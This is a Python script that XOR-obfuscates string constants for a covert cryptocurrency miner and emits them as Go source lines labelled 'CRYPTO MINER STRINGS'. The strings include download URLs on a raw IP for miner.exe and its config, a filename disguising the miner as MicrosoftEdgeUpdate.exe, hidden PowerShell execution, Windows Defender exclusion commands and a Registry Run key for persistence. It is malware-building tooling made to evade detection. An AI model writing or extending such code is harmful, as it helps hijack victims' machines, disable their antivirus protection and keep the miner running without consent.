#!/usr/bin/env python3

key = 0x0B00B135

def xor_encrypt(s):
    k1 = key & 0xff
    k2 = (key >> 8) & 0xff
    k3 = (key >> 16) & 0xff
    k4 = (key >> 24) & 0xff
    
    result = []
    for c in s:
        b = ord(c)
        b ^= k1
        b ^= k2
        b ^= k3
        b ^= k4
        result.append(b)
    
    hex_str = ', '.join([f'0x{b:02X}' for b in result])
    return hex_str, len(result)

# Starting from entry 183
entry_id = 183

strings = [
    ("APPDATA", "APPDATA env var"),
    ("Microsoft", "Microsoft folder"),
    ("EdgeUpdate", "EdgeUpdate folder"),
    ("Install", "Install subfolder"),
    ("MicrosoftEdgeUpdate.exe", "Miner exe name"),
    ("config.json", "Config file name"),
    ("http://23.132.228.234/miner.exe", "Miner download URL"),
    ("http://23.132.228.234/miner_config.json", "Config download URL"),
    ("powershell.exe", "PowerShell executable"),
    ("-WindowStyle", "PowerShell param"),
    ("Hidden", "Hidden window style"),
    ("-Command", "Command param"),
    ("Add-MpPreference -ExclusionPath '%s'", "Defender exclusion path command"),
    ("Add-MpPreference -ExclusionProcess '%s'", "Defender exclusion process command"),
    ("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Registry Run key"),
    ("MicrosoftEdgeUpdateCore", "Registry value name"),
    ("advapi32.dll", "advapi32 DLL"),
    ("RegSetValueExW", "RegSetValueExW function"),
]

print("// ============ CRYPTO MINER STRINGS ============")
for s, comment in strings:
    hex_data, length = xor_encrypt(s)
    print(f"\taddEntry({entry_id}, []byte{{{hex_data}}}, {length}) // {comment}")
    entry_id += 1

print(f"\n// Total entries: {entry_id}")
